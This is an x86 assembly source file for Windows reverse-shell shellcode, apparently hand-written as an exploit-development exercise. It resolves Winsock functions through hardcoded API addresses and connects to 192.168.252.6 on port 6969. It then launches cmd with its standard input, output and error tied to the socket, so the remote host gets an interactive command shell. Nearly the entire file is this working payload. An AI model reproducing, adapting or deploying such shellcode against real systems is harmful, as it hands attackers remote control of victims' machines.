global _start

section .text

_start:
	; Get the windows socket dll name
	xor eax, eax		; Clear reg
	mov ax, 0x3233         	; '\0\023' 
	push eax		; NULL terminate string
	push dword 0x5f327377  	; '_2sw'
	push esp

	; HMODULE LoadLibraryA(
	;   LPCSTR lpLibFileName
	; );
	mov ebx, 0x77e3395c	; LoadLibraryA(libraryname)
	call ebx		; Call function
	mov ebp, eax		; WinSocket DLL handle is saved into EBP

	; Get the funtion name: WSAStartUp
	xor eax, eax		; Clear reg
	mov ax, 0x7075      	; '\0\0up'
	push eax		; NULL terminate string for space
	push 0x74726174     	; 'trat'
	push 0x53415357     	; 'SASW'
	push esp		; Reference to pushed string
	push ebp		; Push WinSocket handle reference

	mov ebx, 0x77e333d3	; GetProcAddress(hmodule, functionname)
	call ebx		; Call function

	; int WSAStartup(
	;   WORD      wVersionRequired,
	;   LPWSADATA lpWSAData
	; );
	xor ebx, ebx		; Clear reg
	mov bx, 0x0190		
	sub esp, ebx
	push esp		; lpWSAData
	push ebx		; wVersionRequired
	call eax		; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)

	; Get the function name: WSASocketA
	xor eax, eax		; Clear reg
	mov ax, 0x4174      	; '\0\0At'
	push eax		; NULL terminate string for space
	push 0x656b636f     	; 'ekco'
	push 0x53415357     	; 'SASW'
	push esp		; Point to string
	push ebp		
	mov ebx, 0x77e333d3   	; GetProcAddress(hmodule, functionname)
	call ebx		; Call function

	; SOCKET WSAAPI WSASocketA(
	;   int                 af,
	;   int                 type,
	;   int                 protocol,
	;   LPWSAPROTOCOL_INFOA lpProtocolInfo,
	;   GROUP               g,
	;   DWORD               dwFlags
	; );	
	xor ebx, ebx		; Clear reg
	push ebx		; NULL
	push ebx		; NULL
	push ebx		; NULL
	xor ecx, ecx		; Clear reg
	mov cl, 6		; IPPROTO_TCP = 6
	push ecx		; Push IPPROTO_TCP
	inc ebx			; SOCK_STREAM = 1
	push ebx		; Push SOCK_STREAM
	inc ebx			; AF_INET = 2
	push ebx		; Push AF_INET
	call eax		; WSASocket(AF_INET = 2, SOCK_STREAM = 1,
				;   IPPROTO_TCP = 6, NULL,
				;   (unsigned int)NULL, (unsigned int)NULL);
	xchg eax, edi		; Save the socket handle into edi

	; Get the function name: connect
	mov ebx, 0x74636565 	; '\0tce'
	shr ebx, 8
	push ebx
	push 0x6e6e6f63     	; 'nnoc'
	push esp
	push ebp
	mov ebx, 0x77e333d3 	; GetProcAddress(hmodule, functionname)
	call ebx

	; int WSAAPI connect(
	;   SOCKET         s,
	;   const sockaddr *name,
	;   int            namelen
	; );
	; push 0x8802a8c0		; 0xc0, 0xa8, 0x02, 0x88 = 192.168.2.136
	push 0x06fca8c0		; 0xc0, 0xa8, 0xfc, 0x06 = 192.168.252.6
	push word 0x391b	; 0x1b39 = port 6969
	xor ebx, ebx		; Clear reg
	add bl, 2		
	push word bx		; Push 2
	mov edx, esp		; Pointer of string in EDX
	push byte 16		; Namelen
	push edx		; *Sockaddr
	push edi		; SOCKET
	call eax            	; connect(s1, (SOCKADDR*) &hax, sizeof(hax) = 16);

	; Call CreateProcessA with redirected streams

	; typedef struct _PROCESS_INFORMATION {
	;   HANDLE hProcess;
	;   HANDLE hThread;
	;   DWORD  dwProcessId;
	;   DWORD  dwThreadId;
	; } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
	mov edx, 0x646d6363	; CommandLine
	shr edx, 8
	push edx
	mov ecx, esp
	xor edx, edx
	sub esp, 16
	mov ebx, esp		; PROCESS_INFORMATION

	; typedef struct _STARTUPINFOA {
	;   DWORD  cb;
	;   LPSTR  lpReserved;
	;   LPSTR  lpDesktop;
	;   LPSTR  lpTitle;
	;   DWORD  dwX;
	;   DWORD  dwY;
	;   DWORD  dwXSize;
	;   DWORD  dwYSize;
	;   DWORD  dwXCountChars;
	;   DWORD  dwYCountChars;
	;   DWORD  dwFillAttribute;
	;   DWORD  dwFlags;
	;   WORD   wShowWindow;
	;   WORD   cbReserved2;
	;   LPBYTE lpReserved2;
	;   HANDLE hStdInput;
	;   HANDLE hStdOutput;
	;   HANDLE hStdError;
	; } STARTUPINFOA, *LPSTARTUPINFOA;	
	push edi
	push edi
	push edi
	push edx		; NULL
	push edx		; NULL
	xor eax, eax		; Clear reg
	inc eax			; +1
	rol eax, 8		
	inc eax
	push eax		; 
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	xor eax, eax		; Clear reg
	add al, 44		
	push eax		; Push 44
	mov eax, esp		; STARTUP_INFO

	; BOOL CreateProcessA(
	;   LPCSTR                lpApplicationName,
	;   LPSTR                 lpCommandLine,
	;   LPSECURITY_ATTRIBUTES lpProcessAttributes,
	;   LPSECURITY_ATTRIBUTES lpThreadAttributes,
	;   BOOL                  bInheritHandles,
	;   DWORD                 dwCreationFlags,
	;   LPVOID                lpEnvironment,
	;   LPCSTR                lpCurrentDirectory,
	;   LPSTARTUPINFOA        lpStartupInfo,
	;   LPPROCESS_INFORMATION lpProcessInformation
	; );
	push ebx		; PROCESS_INFORMATION
	push eax		; STARTUP_INFO
	push edx		; NULL
	push edx		; NULL
	push edx		; NULL
	xor eax, eax		; Clear reg
	inc eax			; +1
	push eax		; 1 == TRUE
	push edx		; NULL
	push edx		; NULL
	push ecx		; Commandline
	push edx		; NULL
	mov ebx, 0x77de2082	; CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	call ebx

end:
	xor edx, edx
	push eax
	mov eax, 0x75982acf	; ExitProcess(exitcode)
	call eax

